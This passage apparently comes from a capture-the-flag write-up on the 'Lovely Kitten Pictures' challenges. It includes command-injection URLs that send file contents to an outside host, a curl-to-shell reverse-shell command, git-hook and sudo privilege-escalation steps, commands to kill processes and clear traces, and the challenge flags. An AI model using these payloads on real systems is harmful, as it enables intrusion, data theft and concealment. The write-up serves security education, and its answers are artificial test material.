<span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>index.php</code> is actually a HTML file without PHP functions, we can ignore it.</p>
<p>From the souce we know that it exactly restrict the path to the <code>projectRoot</code> so that others can not get the <code>/flag1.txt</code> directly.</p>
<p>And the <code>cat_info.php</code> will call a program <code>/var/www/html/cat_info/main</code> with <code>escapeshellcmd</code>. As we know, it cannot execute other shell commands because the special characters are escaped.</p>
<blockquote>
   <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token keyword type-hint">string</span> <span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword return-type">string</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>   <strong>escapeshellcmd()</strong> escapes any characters in a   string that might be used to trick a shell command into executing   arbitrary commands.  This function should be used to make sure   that any data coming from user input is escaped before this data   is passed to the <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.exec.php">exec()</a> or   <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.system.php">system()</a> functions, or to the <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/language.operators.execution.php">backtick operator</a>.  </p>
<p>   Following characters are preceded by a backslash:<br>   </p><pre class="line-numbers language-none"><code class="language-none">&amp;#;`|*?~&lt;&gt;^()[]{}$\, \x0A and \xFF. ' and "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>   are escaped only if they are not paired. On Windows, all these characters   plus <code>%</code> and <code>!</code> are preceded by a caret   (<code>^</code>).  <p></p>
<p>   <em>via <a target="_blank" rel="noopener" href="https://www.php.net/manual/en/function.escapeshellcmd.php">https://www.php.net/manual/en/function.escapeshellcmd.php</a></em></p>
</blockquote>
<p>Next, we get <code>/var/www/html/cat_info/main</code> file with the url <a target="_blank" rel="noopener" href="https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=cat_info/main">https://lovelykittenpictures.ctf.intigriti.io/pictures.php?path=cat_info/main</a> .</p>
<p>It is a program written in Golang. Using IDA to reverse it and we find that it has a help parameter <code>-h</code>, which can also be called with the API above, that is, <a target="_blank" rel="noopener" href="https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-h">https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-h</a> .</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314185924442.png"></p>
<p>BTW, we can get the <code>health_checks/pictures.sh</code> file,  prompting us to execute commands with <code>-e</code> parameter.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token builtin class-name">printf</span> <span class="token string">"â€“â€“â€“â€“â€“â€“â€“â€“ Pictures Health Check â€“â€“â€“â€“â€“â€“â€“â€“<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>

<span class="token keyword">for</span> <span class="token for-or-select variable">kitten</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">10</span><span class="token variable">)</span></span><span class="token punctuation">;</span> <span class="token keyword">do</span>
    <span class="token builtin class-name">printf</span> <span class="token string">"Testing Kitten <span class="token variable">$kitten</span>: "</span>
 
    <span class="token function">wget</span> -q --spider <span class="token string">"http://localhost/assets/<span class="token variable">$kitten</span>.jpg"</span>

    <span class="token keyword">if</span> <span class="token punctuation">[</span><span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">]</span> 
    <span class="token keyword">then</span>
        <span class="token builtin class-name">printf</span> <span class="token string">"OK!<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>    
    <span class="token keyword">else</span>
        <span class="token builtin class-name">printf</span> <span class="token string">"Not OK!<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span>
    <span class="token keyword">fi</span>
<span class="token keyword">done</span>

<span class="token builtin class-name">printf</span> <span class="token string">"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ Tests done â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>Binary programs compiled from Golang are usually hard to reverse, but luckily this time it is so simple that from IDA we can find the way of processing <code>-e</code> param.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314211203982.png"></p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314211940222.png"></p>
<p>It checks the input, which should start with <code>http://localhost</code>, and then execute <code>wget -O - %s | /bin/bash</code> command with the input.</p>
<p>Apparently we can execute commands with backquote ( <code>`whoami`</code> ) and the keyword <code>localhost</code> in the URL can be a subdomain of your domain, or even function as a user accessing your domain (e.g. <a target="_blank" rel="noopener" href="http://localhost@example.com/">http://localhost@example.com</a> ). </p>
<p>Just like:</p>
<pre class="line-numbers language-none"><code class="language-none">http://localhost.114514.miaotony.xyz/?x=`whoami`
http://localhost@114514.miaotony.xyz/?x=`cat /flag2.txt`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>Or we can just use <a target="_blank" rel="noopener" href="https://www.fuzz.red/">the <code>fuzz.red</code> platform developed by my friends</a> to get the http log.</p>
<pre class="line-numbers language-none"><code class="language-none">https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20%22http://localhost@wj0k.fuzz.red/?x=`cat%20/flag2.txt`%22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314214441214.png"></p>
<p>Got it!</p>
<p><code>1337UP{K1TT3N_BYP4SS_W1TH_4T_CH4R4CT3R}</code></p>
<h2 id="Lovely-Kitten-Pictures-3"><a href="#Lovely-Kitten-Pictures-3" class="headerlink" title="Lovely Kitten Pictures 3"></a>Lovely Kitten Pictures 3</h2><blockquote>
<p>A cat is an example of sophistication minus civilization.</p>
</blockquote>
<p>Furthermore, since the <code>main</code> program will call <code>bash</code> through pipeline (<code>|</code>), it is a good idea to put the reverse shell exploit on our web server and fetch it from the victim to get shell directly.</p>
<p>One can find some useful reverse shell commands on <a target="_blank" rel="noopener" href="https://sh.miaotony.xyz/">https://sh.miaotony.xyz/</a> or <a target="_blank" rel="noopener" href="https://sh.miaotony.xyz/reverse-shell-generator/index.html">Reverse Shell Generator</a> .</p>
<p>Or we can use something like <a target="_blank" rel="noopener" href="https://resh.vercel.app/">Reverse Shell as a Service</a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 1. On your machine:</span>
<span class="token function">nc</span> -l <span class="token number">1337</span>

<span class="token comment"># 2. On the target machine:</span>
<span class="token function">curl</span> https://resh.now.sh/yourip:1337 <span class="token operator">|</span> <span class="token function">sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>It is pretty cool.</p>
<pre class="line-numbers language-none"><code class="language-none">https://lovelykittenpictures.ctf.intigriti.io/cat_info.php?id=1%20-e%20%22http://localhost@resh.now.sh/yourip:1337%22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Visit the payload and we get a reverse shell.</p>
<p>And we find the Golang program has its source code called <code>main.go</code> in the same directoryâ€¦ Why didnâ€™t I try it? (((</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314221331198.png"></p>
<p>And this is the source.</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main

<span class="token keyword">import</span> <span class="token punctuation">(</span>
	<span class="token string">"bytes"</span>
	<span class="token string">"encoding/json"</span>
	<span class="token string">"flag"</span>
	<span class="token string">"fmt"</span>
	<span class="token string">"os"</span>
	<span class="token string">"os/exec"</span>
	<span class="token string">"strings"</span>
<span class="token punctuation">)</span>

<span class="token comment">// The Kitten struct is the data structure which is going to represent each kitten</span>
<span class="token keyword">type</span> Kitten <span class="token keyword">struct</span> <span class="token punctuation">{</span>
	Picture <span class="token builtin">string</span>
	Name    <span class="token builtin">string</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">kittenHealthCheck</span><span class="token punctuation">(</span>pictureURL <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">if</span> strings<span class="token punctuation">.</span><span class="token function">Index</span><span class="token punctuation">(</span>pictureURL<span class="token punctuation">,</span> <span class="token string">"http://localhost"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">{</span>
		fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"[*] External requests are not allowed! ğŸˆ"</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	commandString <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"wget -O - %s | /bin/bash"</span><span class="token punctuation">,</span> pictureURL<span class="token punctuation">)</span>
	cmd <span class="token operator">:=</span> exec<span class="token punctuation">.</span><span class="token function">Command</span><span class="token punctuation">(</span><span class="token string">"bash"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">,</span> commandString<span class="token punctuation">)</span>

	<span class="token keyword">var</span> stdout<span class="token punctuation">,</span> stderr bytes<span class="token punctuation">.</span>Buffer
	cmd<span class="token punctuation">.</span>Stdout <span class="token operator">=</span> <span class="token operator">&amp;</span>stdout
	cmd<span class="token punctuation">.</span>Stderr <span class="token operator">=</span> <span class="token operator">&amp;</span>stderr

	err <span class="token operator">:=</span> cmd<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Error: %s\n"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	output<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> <span class="token function">string</span><span class="token punctuation">(</span>stdout<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>stderr<span class="token punctuation">.</span><span class="token function">Bytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"[*] Showing results &amp;#128008;\n\n%s"</span><span class="token punctuation">,</span> output<span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ &amp;#128008; Lovely Kitten Data &amp;#128008; â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“\n\n\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Flags:\n\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"-h	Asks for help &amp;#128008;\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"-c	Pass the ID of a specific kitten &amp;#128008;\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"-e	Pass a local health check in order to execute it (BETA) &amp;#128008;\n\n\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ &amp;#128008; Example Usage &amp;#128008; â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“\n\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"./main -c 4						// Returns data about the 4th registered kitten\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"./main -e http://localhost/health_checks/pictures.sh	// Checks if all the kitten pictures are available\n\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“ &amp;#128008; PS &amp;#128008; â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“â€“\n\n"</span><span class="token punctuation">)</span>
	fmt<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"For security reasons, the local health check functionality only allows requests that comes from localhost"</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>

<span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">var</span> kittens <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>Kitten<span class="token punctuation">{</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/1.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Louie"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/2.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Jasper"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/3.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Biscuit"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/4.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Hot Wheels"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/5.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Nala"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/6.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Simba"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/7.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Mrs Norris"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/8.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Garfield"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/9.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"Fluffer Nutter"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
		<span class="token punctuation">{</span>
			Picture<span class="token punctuation">:</span> <span class="token string">"assets/10.jpg"</span><span class="token punctuation">,</span>
			Name<span class="token punctuation">:</span>    <span class="token string">"PeeWee"</span><span class="token punctuation">,</span>
		<span class="token punctuation">}</span><span class="token punctuation">,</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">var</span> kittenID <span class="token builtin">int</span>
	<span class="token keyword">var</span> askedForHelp <span class="token builtin">bool</span>
	<span class="token keyword">var</span> healthCheckInput <span class="token builtin">string</span>

	flag<span class="token punctuation">.</span><span class="token function">IntVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>kittenID<span class="token punctuation">,</span> <span class="token string">"c"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
	flag<span class="token punctuation">.</span><span class="token function">BoolVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>askedForHelp<span class="token punctuation">,</span> <span class="token string">"h"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
	flag<span class="token punctuation">.</span><span class="token function">StringVar</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>healthCheckInput<span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
	flag<span class="token punctuation">.</span><span class="token function">Parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> askedForHelp <span class="token punctuation">{</span>
		<span class="token function">help</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> healthCheckInput <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">{</span>
		<span class="token function">kittenHealthCheck</span><span class="token punctuation">(</span>healthCheckInput<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> kittenID <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>
		fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token string">"Flag -c expected, but no value was given to it &amp;#128008;"</span><span class="token punctuation">)</span>
		os<span class="token punctuation">.</span><span class="token function">Exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">}</span>

	jsonKitten<span class="token punctuation">,</span> err <span class="token operator">:=</span> json<span class="token punctuation">.</span><span class="token function">Marshal</span><span class="token punctuation">(</span>kittens<span class="token punctuation">[</span>kittenID<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span>
		fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span>
		<span class="token keyword">return</span>
	<span class="token punctuation">}</span>

	fmt<span class="token punctuation">.</span><span class="token function">Print</span><span class="token punctuation">(</span><span class="token function">string</span><span class="token punctuation">(</span>jsonKitten<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314221423793.png"></p>
<p>The <code>/</code> directory has the first 2 flags, so where are the last 2 flags?</p>
<p>In <code>/home</code> dir, we find another 2 users. Maybe the flags are in each userâ€™s dir or <code>/root</code> dir.</p>
<p>Itâ€™s time to <strong>elevate privilege</strong> now.</p>
<p>In <code>/tmp</code> we see a script called <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng/releases/download/20220313/linpeas.sh">linpeas.sh</a> (uploaded by someone else), which is a part of <a target="_blank" rel="noopener" href="https://github.com/carlospolop/PEASS-ng">PEASS-ng</a> - Privilege Escalation Awesome Scripts SUITE new generation on GitHub. </p>
<p>By executing it we can check the <strong>Local Linux Privilege Escalation checklist</strong> from <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist">book.hacktricks.xyz</a>.</p>
<p><strong>Pay attention to the sudoerâ€™s config.</strong></p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314222450703.png"></p>
<pre class="line-numbers language-none"><code class="language-none">www-data ALL=(ALL) NOPASSWD:/bin/su level1
level1 ALL=(admin) NOPASSWD:/usr/bin/git pull<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>The current user <code>www-data</code> can execute <code>/bin/su level1</code> via <code>sudo</code> without password, i.e., <code>sudo su level1</code>.</p>
<p>Flag3 is done!</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314222635989.png"></p>
<p><code>1337UP{SUP3R_34SY_K1TT3N_PR1V3SC}</code></p>
<p>BTW, from <code>pstree</code> we can also know the way of other players hahaha.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220314223619299.png"></p>
<h2 id="Lovely-Kitten-Pictures-4"><a href="#Lovely-Kitten-Pictures-4" class="headerlink" title="Lovely Kitten Pictures 4"></a>Lovely Kitten Pictures 4</h2><blockquote>
<p>Dogs come when theyâ€™re called; cats take a message and get back to you later.</p>
</blockquote>
<p>From sudoerâ€™s config we know the <code>level1</code> user can exec <code>/usr/bin/git pull</code> with <code>admin</code>â€˜s privilege.</p>
<p>From <a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a> and <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/git/#sudo">the <code>git</code> page on it</a> we see that git hooks can execute some shell scripts. </p>
<blockquote>
<p>GTFOBins is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.</p>
<p>Git hooks are merely shell scripts and in the following example the hook associated to the <code>pre-commit</code> action is used. Any other hook will work, just make sure to be able  perform the proper action to trigger it. An existing repository can also be used and moving into the directory works too, i.e., instead of using the <code>-C</code> option.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp -d<span class="token variable">)</span></span>
<span class="token function">git</span> init <span class="token string">"<span class="token variable">$TF</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">'exec /bin/sh 0&lt;&amp;2 1&gt;&amp;2'</span> <span class="token operator">&gt;</span><span class="token string">"<span class="token variable">$TF</span>/.git/hooks/pre-commit.sample"</span>
<span class="token function">mv</span> <span class="token string">"<span class="token variable">$TF</span>/.git/hooks/pre-commit.sample"</span> <span class="token string">"<span class="token variable">$TF</span>/.git/hooks/pre-commit"</span>
<span class="token function">sudo</span> <span class="token function">git</span> -C <span class="token string">"<span class="token variable">$TF</span>"</span> commit --allow-empty -m x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220315011452221.png"></p>
</blockquote>
<p>How can we hook <code>git pull</code>?</p>
<blockquote>
<p>stackoverflow: <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/4185400/is-there-any-git-hook-for-pull">Is there any git hook for pull?</a></p>
<p><a target="_blank" rel="noopener" href="https://git-scm.com/docs/githooks#_post_merge">https://git-scm.com/docs/githooks#_post_merge</a></p>
</blockquote>
<p><strong>Yeah, <code>post-merge</code> can make it.</strong> </p>
<p>And then we find a repository on GitHub, <strong><a target="_blank" rel="noopener" href="https://github.com/arnav-t/git-pull-priv-escalation">git-pull-priv-escalation</a></strong> , and after executing the following commands we get the final flag.</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /tmp/.miao
<span class="token builtin class-name">cd</span> /tmp/.miao
<span class="token function">git</span> clone https://github.com/arnav-t/git-pull-priv-escalation
<span class="token builtin class-name">cd</span> git-pull-priv-escalation
<span class="token function">tar</span> -xvf payload.tar payload
<span class="token builtin class-name">cd</span> payload/slave
<span class="token builtin class-name">echo</span> -e <span class="token string">'#!/bin/bash<span class="token entity" title="\n">\n</span>/bin/cat /home/admin/flag4.txt'</span> <span class="token operator">&gt;</span> .git/hooks/post-merge
<span class="token function">chmod</span> -R <span class="token number">777</span> <span class="token builtin class-name">.</span>
<span class="token function">sudo</span> -u admin <span class="token function">git</span> pull<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220315010953914.png"></p>
<p><code>1337UP{1TS_TH3_F1N4L_K1TT3N}</code></p>
<p>We use <code>chmod</code> here because when using <code>sudo</code> for <code>admin</code> user, he cannot change files in the current and <code>.git</code> directories. <code>admin</code> isnâ€™t like <code>root</code> user who can do everything he wants.</p>
<p>But I donâ€™t know why using <code>exec /bin/sh 0&lt;&amp;2 1&gt;&amp;2</code> for <code>post-merge</code> cannot give me the shell of <code>admin</code> user. Looks like nothing happens after pulling the repository and the user is still <code>level1</code>. (?</p>
<p>Meanwhile, we find that for <code>sudo</code> one can only execute the specific command (<code>git pull</code> in this example) with no password, which means with other parameters we have to input the password. </p>
<p>Therefore in this repository, the author configured 2 git repos, <code>master</code> and <code>slave</code>, and the <code>slave</code>â€˜s remote was pointed to <code>master</code>, which was set in <code>slave/.git/config</code>, in this way we donâ€™t have to add other params after <code>git pull</code>.</p>
<p><img src="/2022/03/13/Pentest_2022_1337UPLIVECTF/image-20220315023508845.png"></p>
<hr>
<p>Finally, letâ€™s clean something like the commands with our server info. </p>
<p><em>(Maybe itâ€™s useless and unnecessaryâ€¦ hahaha</em></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">wget</span> <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> -9
<span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> main <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print <span class="token variable">$2</span>}'</span> <span class="token operator">|</span> <span class="token function">xargs</span> <span class="token function">kill</span> -9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<br>

